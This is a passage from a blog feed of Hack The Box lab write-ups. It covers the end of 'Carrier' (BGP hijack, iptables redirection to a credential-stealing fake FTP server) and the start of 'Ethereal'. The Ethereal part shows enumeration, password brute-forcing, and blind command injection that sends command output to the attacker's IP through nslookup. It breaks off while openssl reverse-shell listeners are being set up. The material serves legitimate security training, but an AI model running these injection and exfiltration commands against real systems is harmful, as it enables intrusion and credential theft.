this line : “one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network” , so on 10.120.15.0 there’s an FTP server and someone is accessing it regularly , on github there’s a python script called fake_ftp which creates an FTP server that steals credentials. We can try it locally with test:test: Now everything is ready , we just need to hijack 10.120.15.0 then run that fake ftp on the host and we will be able to steal credentials , but the script is written in python 2.7 and this host has only python 3 installed : We can fake an FTP server with nc or edit the script to work with python3 , but we will do something different , we will edit iptables rules to route traffic from port 21 on the host to port 21 on our box , so what will finally happen is : Someone tries to connect to the ftp server –&amp;gt; connects to the router instead of the server –&amp;gt; iptables routes that traffic to our box –&amp;gt; our fake ftp server steals the credentials in order to perform our attack we will edit bgpd.conf in /etc/quagga Original : After edits : The only difference is this line network 10.120.15.0/25 Now we will run a python simple http server to host the new bgpd.conf : pythom -m SimpleHTTPServer 80 Then we will delete the old one , download the new conf, edit iptables rules and finally restart the service : iptables commands : iptables -t nat -A PREROUTING -p tcp --dport 21 -j DNAT --to-destination 10.10.xx.xx:21 iptables -t nat -A POSTROUTING -j MASQUERADE Then we will wait for someone to access the fake ftp server watch cat log.txt this will do cat log.txt and refresh it every 2 seconds (log.txt is where the captured credentials are stored) : Finally we get these credentials : root:BGPtelc0rout1ng Now we can ssh to the actual box as root : And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Ethereal Next Hack The Box write-up : Hack The Box - Frolic</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/carrier/0.png" /></entry><entry><title type="html">Hack The Box - Ethereal</title><link href="http://localhost:4000/hack-the-box/ethereal/" rel="alternate" type="text/html" title="Hack The Box - Ethereal" /><published>2019-03-09T00:00:00+02:00</published><updated>2019-03-09T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/ethereal</id><content type="html" xml:base="http://localhost:4000/hack-the-box/ethereal/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-ethereal-retired-and-here-is-my-write-up-about-it-and-as-the-difficulty-says--its-insane--the-most-annoying-part-about-this-box-is-that-it-was-very-hard-to-enumerate-because-we-only-get-a-blind-rce-and-the-firewall-rules-made-it-even-harder-because-it-only-allowed-tcp-connection-for-2-ports-it-was-fun-and-annoying-at-the-same-time-but-i-liked-it-its-a-windows-box-and-its-ip-is-101010106-i-added-it-to-etchosts-as-etherealhtb--lets-jump-right-in-&quot;&gt;Hey guys today Ethereal retired and here is my write-up about it. And as the difficulty says , It’s insane ! The most annoying part about this box is that it was very hard to enumerate because we only get a blind RCE and the firewall rules made it even harder because it only allowed TCP connection for 2 ports. It was fun and annoying at the same time but I liked it. It’s a Windows box and its ip is 10.10.10.106 I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;ethereal.htb&lt;/code&gt; , Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC ethereal.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-get-ftp-on-port-21--http-on-port-80-and-8080-it-also-tells-us-that-ftp-anonymous-authentication-is-allowed-as-always-we-will-enumerate-http-first&quot;&gt;And we get FTP on port 21 , HTTP on port 80 and 8080. It also tells us that FTP anonymous authentication is allowed. As always we will enumerate HTTP first.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;on-port-80-we-see-this-website-&quot;&gt;On port 80 we see this website :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-only-interseting-thing-is-in-the-menu-we-see-an-admin-area-&quot;&gt;The only interseting thing is in the menu we see an Admin-area :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;clicking-on-that-we-get-redirected-to-this-page-which-has-some-other-options-like-notes--messages--desktop-and-ping-&quot;&gt;Clicking on that we get redirected to this page which has some other options like Notes , Messages , Desktop and Ping :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-going-to-notes-we-only-get-this-&quot;&gt;By going to &lt;code class=&quot;highlighter-rouge&quot;&gt;notes&lt;/code&gt; we only get this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-now-we-know-that-theres-a-test-connection-page-somewhere--we-also-get-a-potential-username-alan-by-clicking-on-messages-we-get-nothing--but-desktop-&quot;&gt;So now we know that there’s a “test connection” page somewhere , we also get a potential username &lt;code class=&quot;highlighter-rouge&quot;&gt;alan&lt;/code&gt;. By clicking on &lt;code class=&quot;highlighter-rouge&quot;&gt;messages&lt;/code&gt; we get nothing , but &lt;code class=&quot;highlighter-rouge&quot;&gt;desktop&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-its-very-clear-that-this-is-fake--also-the-usertxt-is-a-troll-&quot;&gt;And it’s very clear that this is fake , also the user.txt is a troll :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-clicking-on-ping-we-get-redirected-to-port-8080-which-asks-us-for-authentication-and-it-uses-http-basic-auth-&quot;&gt;By clicking on &lt;code class=&quot;highlighter-rouge&quot;&gt;ping&lt;/code&gt; we get redirected to port 8080 which asks us for authentication and it uses http basic auth :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-now-we-know-whats-on-port-8080--the-test-connection-page-but-we-need-credentials-to-access-it&quot;&gt;So now we know what’s on port 8080 , the “Test Connection” page. But we need credentials to access it.&lt;/h4&gt;
&lt;h4 id=&quot;one-more-thing-to-check-is-sub-directory-enumeration-with-gobsuter-or-any-alternative-&quot;&gt;One more thing to check is sub directory enumeration with gobsuter or any alternative :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster -u http://ethereal.htb -w /usr/share/wordlists/dirb/common.txt -t 100 -to 250s 
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://ethereal.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 4m10s
=====================================================
2019/03/06 21:51:24 Starting gobuster
=====================================================
/corp (Status: 301)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;gobuster-only-found-corp-with-the-wordlist-usrsharewordlistsdirbcommontxt-and-thats-the-subdirectory-that-had-the-admin-stuff-we-cant-get-any-more-info-and-theres-nothing-to-exploit-so-next-thing-to-look-at-is-ftp&quot;&gt;gobuster only found &lt;code class=&quot;highlighter-rouge&quot;&gt;/corp&lt;/code&gt; with the wordlist &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt; and that’s the subdirectory that had the admin stuff. We can’t get any more info and there’s nothing to exploit so next thing to look at is FTP&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ftp-enumeration&quot;&gt;FTP Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;on-ftp-there-are-some-files-but-the-most-interesting-ones-are-fdiskzip-and-diskzip-so-we-will-check-them-first-&quot;&gt;On FTP there are some files but the most interesting ones are &lt;code class=&quot;highlighter-rouge&quot;&gt;FDISK.zip&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;DISK.zip&lt;/code&gt; so we will check them first :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-unzip-them-&quot;&gt;We will &lt;code class=&quot;highlighter-rouge&quot;&gt;unzip&lt;/code&gt; them :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-check-what-kind-of-files-do-we-have-with-file-&quot;&gt;Then we will check what kind of files do we have with &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;most-likely-they-are-mountable-disks-so-we-will-create-a-directory-to-mount-them-and-call-it-mnt-then-we-will-make-a-directory-for-disk1--disk2-and-fdisk-and-finally-we-will-mount-them-mount--o-loop-disk-directory-&quot;&gt;Most likely they are mountable disks so we will create a directory to mount them and call it &lt;code class=&quot;highlighter-rouge&quot;&gt;mnt&lt;/code&gt; then we will make a directory for &lt;code class=&quot;highlighter-rouge&quot;&gt;disk1&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;disk2&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;fdisk&lt;/code&gt; and finally we will mount them &lt;code class=&quot;highlighter-rouge&quot;&gt;mount -o loop [Disk] [Directory]&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;in-disk1-and-disk2-there-are-some-files-that-are-not-very-interesting-&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;disk1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;disk2&lt;/code&gt; there are some files that are not very interesting :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/13.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-on-fdisk-theres-a-directory-called-pbox-&quot;&gt;But on fdisk there’s a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;pbox&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-contains-an-executable-called-pboxexe-and-a-dat-file-called-pboxdat-&quot;&gt;It contains an executable called &lt;code class=&quot;highlighter-rouge&quot;&gt;pbox.exe&lt;/code&gt; and a dat file called &lt;code class=&quot;highlighter-rouge&quot;&gt;pbox.dat&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;getting-credentials&quot;&gt;Getting Credentials&lt;/h3&gt;
&lt;h4 id=&quot;we-will-switch-to-a-windows-box-to-run-that-executable--you-can-alternatively-use-wine-or-a-program-called-dosbox-wine-didnt-work-for-me-and-dosbox-kept-crashing-every-15-seconds&quot;&gt;We will switch to a windows box to run that executable , you can alternatively use &lt;code class=&quot;highlighter-rouge&quot;&gt;wine&lt;/code&gt; or a program called &lt;code class=&quot;highlighter-rouge&quot;&gt;dosbox&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;wine&lt;/code&gt; didn’t work for me and &lt;code class=&quot;highlighter-rouge&quot;&gt;dosbox&lt;/code&gt; kept crashing every 15 seconds.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;when-we-try-to-open-it-it-asks-for-a-password-&quot;&gt;When we try to open it it asks for a password :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;at-this-point-the-only-option-i-had-was-to-guess-the-password-because-i-didnt-know-how-to-bruteforce-the-password-in-this-case--however-the-password-was-password-d--so-no-bruteforce-is-needed-its-only-a-quick-guess--after-we-get-in--we-see-this-password-database-&quot;&gt;At this point the only option I had was to guess the password because I didn’t know how to bruteforce the password in this case , however the password was “password” :D , so no bruteforce is needed it’s only a quick guess , after we get in , we see this password database :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;databases-&quot;&gt;databases :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;msdn-&quot;&gt;msdn :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;learning-&quot;&gt;learning :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;ftp-drop-&quot;&gt;ftp drop :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;backup-&quot;&gt;backup :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;website-uploads-&quot;&gt;website uploads :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;truecrypt-&quot;&gt;truecrypt :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;management-server-&quot;&gt;management server :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;svn-&quot;&gt;svn :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;back-to-our-kali--now-we-can-create-a-list-with-all-the-information-we-got-&quot;&gt;Back to our kali , now we can create a list with all the information we got :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-put-the-passwords-in-a-separate-list-to-bruteforce-the-http-auth-with-it-&quot;&gt;I put the passwords in a separate list to bruteforce the http auth with it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-use-wfuzz-and-we-will-try-the-username-alan-first-&quot;&gt;We will use &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; and we will try the username &lt;code class=&quot;highlighter-rouge&quot;&gt;alan&lt;/code&gt; first :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -u http://ethereal.htb:8080 --basic alan:FUZZ -w passwords.txt&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password--c414m17y57r1k3s4g41n&quot;&gt;Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;!C414m17y57r1k3s4g41n!&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;blind-rce&quot;&gt;Blind RCE&lt;/h3&gt;
&lt;h4 id=&quot;now-after-we-login-we-get-the-test-connection-page-and-we-have-an-input-for-the-ip-address-to-ping&quot;&gt;Now after we login we get the “Test Connection” page and we have an input for the ip address to ping.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-try-to-bypass-that-and-inject-system-commands-using--or---but-we-dont-get-any-output-i-also-tried-to-host-ncexe-on-a-python-http-server-and-used-certutil-to-download-it-but-the-python-server-didnt-get-any-requests-finally-when-i-ran-responder-responder--i-tun0-then-did-this-1010xxxx--nslookup-test-1010xxxx&quot;&gt;Now we can try to bypass that and inject system commands using &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;|&lt;/code&gt; , but we don’t get any output. I also tried to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; on a python http server and used &lt;code class=&quot;highlighter-rouge&quot;&gt;certutil&lt;/code&gt; to download it but the python server didn’t get any requests. Finally when I ran responder &lt;code class=&quot;highlighter-rouge&quot;&gt;responder -I tun0&lt;/code&gt; then did this &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.xx.xx &amp;amp; nslookup test 10.10.xx.xx&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-finally-got-something-&quot;&gt;I finally got something :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-try-to-execute-a-system-command-and-get-the-output-by-doing-this-&quot;&gt;We can try to execute a system command and get the output by doing this :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.xx.xx &amp;amp; for /f %i in ('whoami') do nslookup %i 10.10.xx.xx&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-is-executing-whoami-then-taking-the-output-and-doing-nslookup-with-the-output-to-our-ip-&quot;&gt;This is executing &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; then taking the output and doing nslookup with the output to our ip :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-etherealalan-and-thats-unusual-as-we-expected-etherealalan&quot;&gt;We get &lt;code class=&quot;highlighter-rouge&quot;&gt;etherealalan&lt;/code&gt; and that’s unusual as we expected &lt;code class=&quot;highlighter-rouge&quot;&gt;ethereal\alan&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-start-enumerating-the-filesystem-this-way--read-this-if-you-dont-understand-some-of-the-for-commands-that-we-will-use&quot;&gt;We will start enumerating the filesystem this way , &lt;a href=&quot;https://ss64.com/nt/for_f.html&quot;&gt;read this&lt;/a&gt; if you don’t understand some of the &lt;code class=&quot;highlighter-rouge&quot;&gt;for&lt;/code&gt; commands that we will use.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.xx.xx &amp;amp; for /f %i in ('cd') do nslookup %i 10.10.xx.xx&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/37.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-the-current-directory-is-cwindowssystem32inetsrv&quot;&gt;So the current directory is &lt;code class=&quot;highlighter-rouge&quot;&gt;c:\windows\system32\inetsrv&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;we-also-need-to-know-the-users-on-the-box-&quot;&gt;We also need to know the users on the box :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.xx.xx &amp;amp; for /f &quot;tokens=1,2,3&quot; %a in ('dir /B &quot;C:\Users&quot;') do nslookup %a.%b.%c 10.10.xx.xx&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-5-users-on-the-box-alan--jorge--public--rupal-and-administrator-we-are-executing-commands-as-alan&quot;&gt;We have 5 users on the box &lt;code class=&quot;highlighter-rouge&quot;&gt;alan&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;jorge&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;Public&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;rupal&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Administrator&lt;/code&gt;. We are executing commands as &lt;code class=&quot;highlighter-rouge&quot;&gt;alan&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-thing-to-look-at-is-the-installed-programs-&quot;&gt;Next thing to look at is the installed programs :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.xx.xx &amp;amp; for /f &quot;tokens=1,2,3&quot; %a in ('dir /B &quot;C:\Program Files (x86)&quot;') do nslookup %a.%b.%c 10.10.xx.xx&lt;/code&gt; 
&lt;img src=&quot;/images/hackthebox/ethereal/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-notice-that-openssl-is-installed-which-is-unusual--we-also-need-to-know-why-cant-we-make-the-box-connect-back-to-us-so-we-will-check-the-firewall-rules-in-our-case-the-easiest-way-to-do-this-is-to-execute-the-command-and-only-look-for-the-string-rule-name-then-redirect-that-output-to-a-file--and-read-that-file-like-we--are-doing-but-first-we-need-to-find-a-place-that-we-can-write-to-after-some-attempts-i-could-write-to-cuserspublicdesktopshortcuts--so-we-will-do-this-&quot;&gt;We notice that OpenSSL is installed which is unusual , we also need to know why can’t we make the box connect back to us so we will check the firewall rules. In our case the easiest way to do this is to execute the command and only look for the string &lt;code class=&quot;highlighter-rouge&quot;&gt;Rule Name:&lt;/code&gt; then redirect that output to a file , and read that file like we  are doing. But first we need to find a place that we can write to. After some attempts I could write to &lt;code class=&quot;highlighter-rouge&quot;&gt;c:\users\public\desktop\shortcuts&lt;/code&gt; , so we will do this :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.xx.xx &amp;amp; netsh advfirewall firewall show rule name=all | findstr &quot;Rule Name:&quot; &amp;gt; C:\Users\Public\Desktop\Shortcuts\firewall.txt&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-list-the-contents-of-cuserspublicdesktopshortcuts&quot;&gt;Then we will list the contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;c:\users\public\desktop\shortcuts&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.xx.xx &amp;amp; for /f &quot;tokens=1,2,3&quot; %a in ('dir /B &quot;C:\Users\Public\Desktop\Shortcuts&quot;') do nslookup %a.%b.%c 10.10.xx.xx&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-see-that-we-have-successfully-written-into-that-directory--next-step-is-to-read-the-file-&quot;&gt;And we see that we have successfully written into that directory , next step is to read the file :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.xx.xx &amp;amp; for /f &quot;tokens=1,2,3,4,5,6,7&quot; %a in ('type C:\Users\Public\Desktop\Shortcuts\firewall.txt') do nslookup %a.%b.%c.%d.%e.%f.%g 10.10.xx.xx&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-only-allowing-tcp-conections-to-port-73-and-136--we-saw-earlier-that-openssl-was-installed-on-the-box--we-can-create-a-ssltls-server-on-these-ports-and-use-openssl-to-make-the-box-connect-back-to-us&quot;&gt;It’s only allowing TCP conections to port &lt;code class=&quot;highlighter-rouge&quot;&gt;73&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;136&lt;/code&gt; , we saw earlier that openssl was installed on the box , we can create a &lt;code class=&quot;highlighter-rouge&quot;&gt;SSL/TLS server&lt;/code&gt; on these ports and use openssl to make the box connect back to us.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;generating-certs-and-setting-up-the-server&quot;&gt;Generating certs and setting up the server&lt;/h3&gt;
&lt;h4 id=&quot;first-step-is-to-generate-certificates-because-we-need-them-to-set-up-the-server&quot;&gt;First step is to generate certificates because we need them to set up the server&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -days 365 -nodes&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-split-our-terminal-and-run-2-servers--one-on-port-73-and-the-other-on-port-136&quot;&gt;Then we will split our terminal and run 2 servers , one on port 73 and the other on port 136&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl s_server -key key.pen -cert certificate.pem -quiet -port [port]&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;read-more-about-s_server&quot;&gt;&lt;a href=&quot;https://www.openssl.org/docs/man1.0.2/man1/openssl-s_server.html&quot;&gt;Read more about s_server&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;we-are-setting-up-2-servers-because-we-are-going-to-use-openssl-on-the-box-to-connect-on-port-73-and-take-our-input--then-we-will-pipe-that-input-to-cmdexe-then-we-will-pipe-the-output-to-our-server-on-port-136&quot;&gt;We are setting up 2 servers because we are going to use openssl on the box to connect on port 73 and take our input , then we will pipe that input to cmd.exe then we will pipe the output to our server on port 136.&lt;/h4&gt;
&lt;h4 id=&quot;now-we-need-to-locate-opensslexe--if-we-listed-the-contents-of-openssl-v110-in-program-files-x86-can-also-be-written-progra2-check-this-we-will-get-this-output-&quot;&gt;Now we need to locate openssl.exe , if we listed the contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;OpenSSL-v1.1.0&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;Program Files (x86)&lt;/code&gt; (can also be written &lt;code class=&quot;highlighter-rouge&quot;&gt;Progra~2&lt;/code&gt;. check &lt;a href=&quot;https://stackoverflow.com/questions/892555/how-do-i-specify-c-program-files-without-a-space-in-it-for-programs-that-cant/892568&quot;&gt;this&lt;/a&gt;) we will get this output :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.xx.xx &amp;amp; for /f &quot;tokens=1,2,3&quot; %a in ('dir /B &quot;C:\Program Files (x86)\OpenSSL-v1.1.0&quot;') do nslookup %a.%b.%c 10.10.xx.xx&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
